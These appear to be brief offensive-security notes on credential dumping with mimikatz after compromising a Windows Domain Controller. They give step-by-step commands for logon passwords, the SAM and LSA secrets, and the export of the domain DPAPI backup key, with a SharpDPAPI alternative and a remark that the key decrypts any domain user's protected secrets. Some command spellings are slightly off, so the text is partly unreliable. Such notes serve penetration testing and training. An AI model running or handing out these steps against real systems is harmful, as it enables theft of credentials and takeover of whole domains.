- - -
If we have compromised the **Domain Controller**, then we can use this.
Learn more about mimikatz [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki)

- - -
> [! Note ] 
> ( use cheetsheets )

## Attacking Steps : 

☐ Go and download it [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
☐ Then Treansfer it to windows. ( Domain Controller's system )
☐ Unzip it.

```cmd
 cd path\to\mimikatz 
 mimikatz.exe 
 
 mimicatz #  privilege::debug                            ( Do always )
 mimicatz #  sekurlsa::logonpassword 
 mimicatz #  lsadump::sam 
 mimicatz #  lsadump::lsa /patch 
 
```

now go and run more comands....

Don't worry if you are failing to dump “**sam**”. You have **DC** and **Administrators** **hash** which we can use to dump “**sam**” with **impackets**, **Metasploit**, etc.

- - -
## By AlH4zr3d  : 
https://twitter.com/Alh4zr3d/status/1616509628480880641

![Imgur](https://i.imgur.com/oB0Tz3A.png)

```c
lsadump::backupkeys /system:dc01.offense.local /export
```

To be clear, this is a mimikatz command that requires **domain admin permissions**, but once the backup key is obtained, it allows you to **decrypt the master keys** protecting data blobs (like passwords) from any domain user.

#### SharpDPAPI alternative : 

```
SharpDPAPI.exe backupkey /nowrap
```

 - - -
